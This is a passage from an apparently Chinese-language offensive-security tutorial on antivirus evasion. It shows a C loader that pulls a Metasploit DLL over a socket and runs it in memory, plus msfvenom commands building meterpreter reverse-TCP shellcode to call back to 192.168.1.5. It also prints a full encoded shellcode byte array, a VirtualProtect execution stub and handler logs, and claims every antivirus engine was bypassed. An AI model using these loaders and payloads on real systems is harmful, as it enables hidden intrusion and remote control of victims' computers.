	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">connect</span><span class="token punctuation">(</span>socks<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>sin<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>sin<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> SOCKET_ERROR <span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		dwError <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*]Bind Error : %d \n"</span><span class="token punctuation">,</span>dwError<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	
	<span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	ret <span class="token operator">=</span> <span class="token function">recv</span><span class="token punctuation">(</span>socks<span class="token punctuation">,</span><span class="token punctuation">(</span>PCHAR<span class="token punctuation">)</span>bFileBuffer<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	ret <span class="token operator">=</span> <span class="token function">recv</span><span class="token punctuation">(</span>socks<span class="token punctuation">,</span><span class="token punctuation">(</span>PCHAR<span class="token punctuation">)</span>bFileBuffer<span class="token punctuation">,</span><span class="token number">2650</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	ret <span class="token operator">=</span> <span class="token function">recv</span><span class="token punctuation">(</span>socks<span class="token punctuation">,</span><span class="token punctuation">(</span>PCHAR<span class="token punctuation">)</span>bFileBuffer<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	ret <span class="token operator">=</span> <span class="token function">recv</span><span class="token punctuation">(</span>socks<span class="token punctuation">,</span><span class="token punctuation">(</span>PCHAR<span class="token punctuation">)</span>bFileBuffer<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	ret <span class="token operator">=</span> <span class="token function">recv</span><span class="token punctuation">(</span>socks<span class="token punctuation">,</span><span class="token punctuation">(</span>PCHAR<span class="token punctuation">)</span>bFileBuffer<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">ZeroMemory</span><span class="token punctuation">(</span>bFileBuffer<span class="token punctuation">,</span>PAYLOAD_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>

	
	ret <span class="token operator">=</span> <span class="token function">recv</span><span class="token punctuation">(</span>socks<span class="token punctuation">,</span><span class="token punctuation">(</span>PCHAR<span class="token punctuation">)</span>bFileBuffer<span class="token punctuation">,</span><span class="token number">5120</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">closesocket</span><span class="token punctuation">(</span>socks<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>


	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span> 

<span class="token comment">// 打开文件并获取大小</span>
DWORD <span class="token function">OpenBadCodeDLL</span><span class="token punctuation">(</span>HANDLE <span class="token operator">&amp;</span> hBadCodeDll<span class="token punctuation">,</span> LPCWSTR lpwszBadCodeFileName<span class="token punctuation">)</span><span class="token punctuation">{</span>
	DWORD dwHighFileSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	DWORD dwLowFileSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token comment">// 打开文件</span>
	hBadCodeDll <span class="token operator">=</span> <span class="token function">CreateFile</span><span class="token punctuation">(</span>lpwszBadCodeFileName<span class="token punctuation">,</span>GENERIC_READ<span class="token punctuation">,</span>FILE_SHARE_READ<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span>OPEN_ALWAYS<span class="token punctuation">,</span>FILE_ATTRIBUTE_NORMAL <span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>hBadCodeDll <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">return</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	dwLowFileSize <span class="token operator">=</span> <span class="token function">GetFileSize</span><span class="token punctuation">(</span>hBadCodeDll<span class="token punctuation">,</span><span class="token operator">&amp;</span>dwHighFileSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> dwLowFileSize<span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	
	HMEMORYMODULE hModule<span class="token punctuation">;</span>
	Module DllMain<span class="token punctuation">;</span>
	bFileBuffer <span class="token operator">=</span> new BYTE<span class="token punctuation">[</span>PAYLOAD_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token function">GetPEDLL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 导入PE文件</span>
	hModule <span class="token operator">=</span> <span class="token function">MemoryLoadLibrary</span><span class="token punctuation">(</span>bFileBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 如果加载失败，就退出</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>hModule <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		delete <span class="token punctuation">[</span><span class="token punctuation">]</span> bFileBuffer<span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token comment">// 获取msg导出函数地址</span>
	DllMain <span class="token operator">=</span> <span class="token punctuation">(</span>Module<span class="token punctuation">)</span><span class="token function">MemoryGetProcAddress</span><span class="token punctuation">(</span>hModule<span class="token punctuation">,</span><span class="token string">"DllMain"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 运行msg函数</span>
	<span class="token function">DllMain</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 释放资源</span>
	DWORD dwThread<span class="token punctuation">;</span>
	HANDLE hThread <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>DllMain<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>dwThread<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>hThread<span class="token punctuation">,</span>INFINITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token function">MemoryFreeLibrary</span><span class="token punctuation">(</span>hModule<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 释放PE内存</span>
	delete <span class="token punctuation">[</span><span class="token punctuation">]</span> bFileBuffer<span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>GetPEDLL函数主要是从MSF上获取DLL，通过recv函数不断接收，偏移获得DLL地址，然后扔给MemoryGetProcAddress。</p>
<p>实现效果如下：<br>
<img src="https://img-blog.csdnimg.cn/20201008170332624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>0x04 总结</strong></p>
<p>注意：学习的过程中，不同位数要对应不同的payload，编译平台也要互相对应</p>
<p>第六课就到这里了，主要是引入反射DLL加载这个技术，以及如何使用这个技术，如果想深入研究，还需要学习Windows PE相关的基础知识。</p>
<p>老样子，V站查杀一下：<img src="https://img-blog.csdnimg.cn/20201008170347641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
挑战了全球的AV，全部通过</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>virustotal<span class="token punctuation">.</span>com<span class="token operator">/</span>gui<span class="token operator">/</span>file<span class="token operator">/</span>f27a16434684986206921c63a3d5d71e5ede3f95a6175fd9572a5b5029adc28c<span class="token operator">/</span>detection
</code></pre>
<p>所有的新技术，都离不开强大的基础知识的铺垫，通过积攒基础知识，使自己能挑战更多的”不可能”。</p>
<hr>
<h2><a id="9113__Python_shellcode_1703"></a>9.1.13 基于 Python内存加载 shellcode</h2>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>cloud<span class="token punctuation">.</span>tencent<span class="token punctuation">.</span>com<span class="token operator">/</span>developer<span class="token operator">/</span>article<span class="token operator">/</span><span class="token number">1621172</span>   <span class="token operator">--</span><span class="token operator">-</span>Python内存加载shellcode

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>shuzhiduo<span class="token punctuation">.</span>com<span class="token operator">/</span>A<span class="token operator">/</span>ke5j0qkmzr<span class="token operator">/</span>   <span class="token operator">--</span>Python内存加载shellcode
</code></pre>
<h2><a id="9114_payload_1710"></a>9.1.14 payload分离免杀思路</h2>
<p>目前的反病毒安全软件，常见有三种，一种基于特征，一种基于行为，一种基于云查杀。云查杀的特点基本也可以概括为特征查杀。无论是哪种，都是特别针对 PE 头文件的查杀。尤其是当 payload 文件越大的时候，特征越容易查杀。</p>
<p>既然知道了目前的主流查杀方式，那么反制查杀，此篇采取特征与行为分离免杀。避免 PE 头文件，并且分离行为，与特征的综合免杀。适用于菜刀下等场景，也是我在基于 windows 下为了更稳定的一种常用手法。载入内存。</p>
<p><strong>0x00:以msf为例：监听端口</strong></p>
<p><img src="https://img-blog.csdnimg.cn/20201008203944264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>0x01：shellcode</strong></p>
<p>这里的payload不采取生成pe文件，而采取shellcode方式，来借助第三方直接加载到内存中。避免行为：</p>
<pre><code class="prism language-c">msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp lhost<span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span> lport<span class="token operator">=</span><span class="token number">8080</span> <span class="token operator">-</span>e x86<span class="token operator">/</span>shikata_ga_nai <span class="token operator">-</span>i <span class="token number">5</span> <span class="token operator">-</span>f raw <span class="token operator">&gt;</span> test<span class="token punctuation">.</span>c
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008204053331.png#pic_center" alt="在这里插入图片描述"></p>
<p><strong>0x02: 加载器</strong></p>
<p>既然是shellcode方式的payload，那么一定需要借助第三方来启动，加载到内存。执行shellcode，自己写也不是很难，这里我借用一个github一个开源：</p>
<pre><code class="prism language-c">​https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>clinicallyinane<span class="token operator">/</span>shellcode_launcher<span class="token operator">/</span>​
</code></pre>
<p>作者的话：建议大家自己写shellcode执行盒，相关代码网上非常成熟。如果遇到问题，随时可以问我。<br>
<img src="https://img-blog.csdnimg.cn/20201008204126451.png#pic_center" alt="在这里插入图片描述"></p>
<p>生成的payload大小如下：476字节。还是 X32位的 payload。<br>
​<img src="https://img-blog.csdnimg.cn/20201008204134303.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>国内世界杀毒网：<br>
​<img src="https://img-blog.csdnimg.cn/20201008204141229.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>国际世界杀毒网：<br>
​<br>
<img src="https://img-blog.csdnimg.cn/20201008204148332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>上线成功。<br>
​<br>
<img src="https://img-blog.csdnimg.cn/20201008204155303.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>micro8<span class="token punctuation">.</span>gitbook<span class="token punctuation">.</span>io<span class="token operator">/</span>micro8<span class="token operator">/</span>contents<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">41</span><span class="token operator">-</span><span class="token number">50</span><span class="token operator">/</span><span class="token number">48</span>payload<span class="token operator">-</span>fen<span class="token operator">-</span>li<span class="token operator">-</span>mian<span class="token operator">-</span>sha<span class="token operator">-</span>si<span class="token operator">-</span>lu<span class="token operator">-</span>di<span class="token operator">-</span>er<span class="token operator">-</span>ji   <span class="token operator">--</span>第二季（深入）
</code></pre>
<hr>
<h2><a id="9115_small_payload_1761"></a>9.1.15 基于实战中的small payload应用（一）</h2>
<p>攻击机：</p>
<p>192.168.1.5 Debian</p>
<p>靶机：</p>
<p>192.168.1.4 Windows 7<br>
192.168.1.119 Windows 2003</p>
<p>攻击机配置：</p>
<p>payload：windows/meterpreter/reverse_tcp</p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ 

Payload options <span class="token punctuation">(</span>windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
EXITFUNC process yes Exit technique <span class="token punctuation">(</span>Accepted<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span> seh<span class="token punctuation">,</span> thread<span class="token punctuation">,</span> process<span class="token punctuation">,</span> none<span class="token punctuation">)</span>

LHOST <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span> yes The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>

LPORT <span class="token number">53</span> yes The listen port 

Exploit target<span class="token punctuation">:</span> 

Id Name
‐‐ ‐‐‐‐
<span class="token number">0</span> Wildcard Target

msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span><span class="token punctuation">:</span><span class="token number">53</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008204433855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
payload生成：</p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">/</span>tmp# msfvenom ‐p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span> LPORT<span class="token operator">=</span><span class="token number">53</span> ‐b <span class="token string">'\x00'</span> ‐f exe <span class="token operator">&gt;</span> First<span class="token punctuation">.</span>exe
</code></pre>
<p>原始payload大小如下：</p>
<p>73802字节，大概在72KB</p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">/</span>tmp# du ‐sb First<span class="token punctuation">.</span>exe
<span class="token number">73802</span> First<span class="token punctuation">.</span>exe
</code></pre>
<p>第一次优化payload：</p>
<p>提取windows/meterpreter/reverse_tcp shellcode</p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">/</span>tmp# msfvenom ‐p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span> LPORT<span class="token operator">=</span><span class="token number">53</span> ‐b <span class="token string">'\x00'</span> ‐f c
<span class="token punctuation">[</span>‐<span class="token punctuation">]</span> No platform was selected<span class="token punctuation">,</span> choosing Msf<span class="token punctuation">:</span><span class="token punctuation">:</span>Module<span class="token punctuation">:</span><span class="token punctuation">:</span>Platform<span class="token punctuation">:</span><span class="token punctuation">:</span>Windows from the payload
<span class="token punctuation">[</span>‐<span class="token punctuation">]</span> No arch selected<span class="token punctuation">,</span> selecting arch<span class="token punctuation">:</span> x86 from the payload
Found <span class="token number">11</span> compatible encoders
Attempting to encode payload with <span class="token number">1</span> iterations of x86<span class="token operator">/</span>shikata_ga_nai
x86<span class="token operator">/</span>shikata_ga_nai succeeded with size <span class="token number">368</span> <span class="token punctuation">(</span>iteration<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
x86<span class="token operator">/</span>shikata_ga_nai chosen with final size <span class="token number">368</span>
Payload size<span class="token punctuation">:</span> <span class="token number">368</span> bytes
Final size of c file<span class="token punctuation">:</span> <span class="token number">1571</span> bytes
<span class="token keyword">unsigned</span> <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span>
<span class="token string">"\\xd9\\xc3\\xba\\xa1\\x43\\xe5\\x72\\xd9\\x74\\x24\\xf4\\x5d\\x29\\xc9\\xb1"</span>
<span class="token string">"\\x56\\x31\\x55\\x18\\x03\\x55\\x18\\x83\\xc5\\xa5\\xa1\\x10\\x8e\\x4d\\xa7"</span>
<span class="token string">"\\xdb\\x6f\\x8d\\xc8\\x52\\x8a\\xbc\\xc8\\x01\\xde\\xee\\xf8\\x42\\xb2\\x02"</span>
<span class="token string">"\\x72\\x06\\x27\\x91\\xf6\\x8f\\x48\\x12\\xbc\\xe9\\x67\\xa3\\xed\\xca\\xe6"</span>
<span class="token string">"\\x27\\xec\\x1e\\xc9\\x16\\x3f\\x53\\x08\\x5f\\x22\\x9e\\x58\\x08\\x28\\x0d"</span>
<span class="token string">"\\x4d\\x3d\\x64\\x8e\\xe6\\x0d\\x68\\x96\\x1b\\xc5\\x8b\\xb7\\x8d\\x5e\\xd2"</span>
<span class="token string">"\\x17\\x2f\\xb3\\x6e\\x1e\\x37\\xd0\\x4b\\xe8\\xcc\\x22\\x27\\xeb\\x04\\x7b"</span>
<span class="token string">"\\xc8\\x40\\x69\\xb4\\x3b\\x98\\xad\\x72\\xa4\\xef\\xc7\\x81\\x59\\xe8\\x13"</span>
<span class="token string">"\\xf8\\x85\\x7d\\x80\\x5a\\x4d\\x25\\x6c\\x5b\\x82\\xb0\\xe7\\x57\\x6f\\xb6"</span>
<span class="token string">"\\xa0\\x7b\\x6e\\x1b\\xdb\\x87\\xfb\\x9a\\x0c\\x0e\\xbf\\xb8\\x88\\x4b\\x1b"</span>
<span class="token string">"\\xa0\\x89\\x31\\xca\\xdd\\xca\\x9a\\xb3\\x7b\\x80\\x36\\xa7\\xf1\\xcb\\x5e"</span>
<span class="token string">"\\x04\\x38\\xf4\\x9e\\x02\\x4b\\x87\\xac\\x8d\\xe7\\x0f\\x9c\\x46\\x2e\\xd7"</span>
<span class="token string">"\\x95\\x41\\xd1\\x07\\x1d\\x01\\x2f\\xa8\\x5d\\x0b\\xf4\\xfc\\x0d\\x23\\xdd"</span>
<span class="token string">"\\x7c\\xc6\\xb3\\xe2\\xa8\\x72\\xbe\\x74\\x93\\x2a\\xbf\\x81\\x7b\\x28\\xc0"</span>
<span class="token string">"\\x89\\x4e\\xa5\\x26\\xd9\\xe0\\xe5\\xf6\\x9a\\x50\\x45\\xa7\\x72\\xbb\\x4a"</span>
<span class="token string">"\\x98\\x63\\xc4\\x81\\xb1\\x0e\\x2b\\x7f\\xe9\\xa6\\xd2\\xda\\x61\\x56\\x1a"</span>
<span class="token string">"\\xf1\\x0f\\x58\\x90\\xf3\\xf0\\x17\\x51\\x76\\xe3\\x40\\x06\\x78\\xfb\\x90"</span>
<span class="token string">"\\xa3\\x78\\x91\\x94\\x65\\x2f\\x0d\\x97\\x50\\x07\\x92\\x68\\xb7\\x14\\xd5"</span>
<span class="token string">"\\x97\\x46\\x2c\\xad\\xae\\xdc\\x10\\xd9\\xce\\x30\\x90\\x19\\x99\\x5a\\x90"</span>
<span class="token string">"\\x71\\x7d\\x3f\\xc3\\x64\\x82\\xea\\x70\\x35\\x17\\x15\\x20\\xe9\\xb0\\x7d"</span>
<span class="token string">"\\xce\\xd4\\xf7\\x21\\x31\\x33\\x84\\x26\\xcd\\xc1\\xa3\\x8e\\xa5\\x39\\xf4"</span>
<span class="token string">"\\x2e\\x35\\x50\\xf4\\x7e\\x5d\\xaf\\xdb\\x71\\xad\\x50\\xf6\\xd9\\xa5\\xdb"</span>
<span class="token string">"\\x97\\xa8\\x54\\xdb\\xbd\\x6d\\xc8\\xdc\\x32\\xb6\\xfb\\xa7\\x3b\\x49\\xfc"</span>
<span class="token string">"\\x57\\x52\\x2e\\xfd\\x57\\x5a\\x50\\xc2\\x81\\x63\\x26\\x05\\x12\\xd0\\x39"</span>
<span class="token string">"\\x30\\x37\\x71\\xd0\\x3a\\x6b\\x81\\xf1"</span><span class="token punctuation">;</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008204534539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
建立Micropoor_small_payload工程，配置如下：<br>
<img src="https://img-blog.csdnimg.cn/20201008204549555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201008204553927.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
源码如下：</p>
<pre><code class="prism language-c"><span class="token macro property"># <span class="token directive keyword">include</span> <span class="token string">&lt;windows.h&gt;</span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token keyword">char</span> <span class="token operator">*</span>shellcode <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"Micropoor_shellcode"</span><span class="token punctuation">;</span> 

DWORD Micropoor_shellcode<span class="token punctuation">;</span>
BOOL ret <span class="token operator">=</span> <span class="token function">VirtualProtect</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">,</span>
PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Micropoor_shellcode<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ret<span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">return</span> EXIT_FAILURE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> EXIT_SUCCESS<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>原始shellcode_payload大小如下： 75776字节<br>
<img src="https://img-blog.csdnimg.cn/20201008204612476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
优化： 在优化的过程中，需要确保</p>
<pre><code class="prism language-c">性能  
稳定性  
大小  
可塑性  
免杀性  
</code></pre>
<p>非算法，故优化/01<br>
<img src="https://img-blog.csdnimg.cn/2020100820463384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
无使用预编译头，故否<br>
<img src="https://img-blog.csdnimg.cn/2020100820464530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>无需调试信息，故否<br>
<img src="https://img-blog.csdnimg.cn/20201008204650463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>自定义入口点：execMicropoor_shellcode</p>
<p><img src="https://img-blog.csdnimg.cn/20201008204656223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
再次编译：<img src="https://img-blog.csdnimg.cn/20201008204702282.png#pic_center" alt="在这里插入图片描述"><br>
payload大小如下：<br>
4608字节<br>
<img src="https://img-blog.csdnimg.cn/20201008204714416.png#pic_center" alt="在这里插入图片描述"><br>
第一次靶机测试：分别测试Windows 2003，Windws 7，reverse OK。<br>
<img src="https://img-blog.csdnimg.cn/20201008204725976.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span><span class="token punctuation">:</span><span class="token number">53</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">179779</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span>
